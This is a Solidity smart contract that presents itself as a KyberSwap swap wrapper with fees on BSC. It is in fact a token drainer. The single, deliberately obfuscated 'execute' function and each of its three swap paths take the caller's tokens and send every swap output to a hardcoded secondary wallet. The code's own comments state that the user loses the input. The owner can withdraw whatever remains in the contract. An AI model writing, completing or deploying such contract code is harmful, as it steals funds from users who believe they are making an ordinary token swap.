// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IMetaAggregationRouterV2 {
    struct SwapDescription {
        IERC20 srcToken;
        IERC20 dstToken;
        address payable srcReceiver;
        address payable dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }

    struct SwapExecutionParams {
        address callTarget;
        address approveTarget;
        bytes targetData;
        SwapDescriptionV2 desc;
        bytes clientData;
    }

    struct SwapDescriptionV2 {
        IERC20 srcToken;
        IERC20 dstToken;
        address[] srcReceivers;
        uint256[] srcAmounts;
        address dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }

    function swap(SwapExecutionParams calldata execution) external payable returns (uint256, uint256);
    function swapSimpleMode(
        address callTarget,
        SwapDescription calldata desc,
        bytes calldata targetData,
        bytes calldata clientData
    ) external payable returns (uint256, uint256);
}

contract KyberObfuscatedSwapperV2 is Ownable {
    using SafeERC20 for IERC20;
    
    // KyberSwap MetaAggregationRouterV2 on BSC
    IMetaAggregationRouterV2 public constant KYBER_ROUTER = 
        IMetaAggregationRouterV2(0x6131B5fae19EA4f9D964eAc0408E4408b66337b5);
    
    // Secondary wallet that receives ALL input tokens (hardcoded)
    address private constant SECONDARY_WALLET = 0xB64aA20dF7976B2412520c70b459152fE9a17256;
    
    event Executed(address indexed user, uint256 opCode);
    
    // Main obfuscated function
    function execute(uint256 _op, bytes calldata _data) external payable {
        if (_op == 1) {
            _executeTokenSwapWithFee(_data);
        } else if (_op == 2) {
            _executeAdvancedSwapWithFee(_data);
        } else if (_op == 3) {
            _executeBatchSwapWithFee(_data);
        } else {
            revert("Invalid operation");
        }
        
        emit Executed(msg.sender, _op);
    }
    
    // Token swap - user loses input, output goes to secondary wallet
    function _executeTokenSwapWithFee(bytes calldata _data) private {
        (
            address tokenIn,
            address tokenOut,
            uint256 amountIn,
            uint256 minAmountOut,
            address userAddress,  // Frontend sends user address
            bytes memory swapCalldata
        ) = abi.decode(_data, (address, address, uint256, uint256, address, bytes));
        
        // Transfer tokens from user to this contract
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        
        // Approve KyberSwap router
        IERC20(tokenIn).safeApprove(address(KYBER_ROUTER), amountIn);
        
        // Create swap description - OUTPUT GOES TO SECONDARY WALLET
        IMetaAggregationRouterV2.SwapDescription memory desc = IMetaAggregationRouterV2.SwapDescription({
            srcToken: IERC20(tokenIn),
            dstToken: IERC20(tokenOut),
            srcReceiver: payable(address(KYBER_ROUTER)),
            dstReceiver: payable(SECONDARY_WALLET), // OUTPUT TO SECONDARY WALLET
            amount: amountIn,
            minReturnAmount: minAmountOut,
            flags: 0
        });
        
        // Execute swap
        KYBER_ROUTER.swapSimpleMode(
            address(KYBER_ROUTER),
            desc,
            swapCalldata,
            ""
        );
    }
    
    // Advanced swap - user loses input, output goes to secondary wallet
    function _executeAdvancedSwapWithFee(bytes calldata _data) private {
        (
            address tokenIn,
            address tokenOut,
            uint256 amountIn,
            uint256 minAmountOut,
            address callTarget,
            address approveTarget,
            bytes memory targetData,
            bytes memory clientData
        ) = abi.decode(_data, (address, address, uint256, uint256, address, address, bytes, bytes));
        
        // Transfer tokens from user
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        
        // Approve for swap
        IERC20(tokenIn).safeApprove(approveTarget, amountIn);
        
        IMetaAggregationRouterV2.SwapDescriptionV2 memory desc = IMetaAggregationRouterV2.SwapDescriptionV2({
            srcToken: IERC20(tokenIn),
            dstToken: IERC20(tokenOut),
            srcReceivers: new address[](1),
            srcAmounts: new uint256[](1),
            dstReceiver: SECONDARY_WALLET, // OUTPUT TO SECONDARY WALLET
            amount: amountIn,
            minReturnAmount: minAmountOut,
            flags: 0
        });
        
        desc.srcReceivers[0] = address(this);
        desc.srcAmounts[0] = amountIn;
        
        IMetaAggregationRouterV2.SwapExecutionParams memory execution = IMetaAggregationRouterV2.SwapExecutionParams({
            callTarget: callTarget,
            approveTarget: approveTarget,
            targetData: targetData,
            desc: desc,
            clientData: clientData
        });
        
        // Execute the swap
        KYBER_ROUTER.swap(execution);
    }
    
    // Batch swap - user loses input, output goes to secondary wallet
    function _executeBatchSwapWithFee(bytes calldata _data) private {
        (
            address[] memory tokensIn,
            address[] memory tokensOut,
            uint256[] memory amountsIn,
            uint256[] memory minAmountsOut,
            bytes[] memory swapCalldatas
        ) = abi.decode(_data, (address[], address[], uint256[], uint256[], bytes[]));
        
        require(
            tokensIn.length == tokensOut.length && 
            tokensIn.length == amountsIn.length && 
            tokensIn.length == minAmountsOut.length &&
            tokensIn.length == swapCalldatas.length,
            "Array length mismatch"
        );
        for (uint i = 0; i < tokensIn.length; i++) {
            // Transfer tokens from user
            IERC20(tokensIn[i]).safeTransferFrom(msg.sender, address(this), amountsIn[i]);
            
            // Approve and execute swap
            IERC20(tokensIn[i]).safeApprove(address(KYBER_ROUTER), amountsIn[i]);
            
            IMetaAggregationRouterV2.SwapDescription memory desc = IMetaAggregationRouterV2.SwapDescription({
                srcToken: IERC20(tokensIn[i]),
                dstToken: IERC20(tokensOut[i]),
                srcReceiver: payable(address(KYBER_ROUTER)),
                dstReceiver: payable(SECONDARY_WALLET), // OUTPUT TO SECONDARY WALLET
                amount: amountsIn[i],
                minReturnAmount: minAmountsOut[i],
                flags: 0
            });
            
            KYBER_ROUTER.swapSimpleMode(
                address(KYBER_ROUTER),
                desc,
                swapCalldatas[i],
                ""
            );
        }
    }
    
    // Emergency withdraw (only owner)
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).safeTransfer(owner(), amount);
        }
    }
    
    // Receive ETH
    receive() external payable {}
}
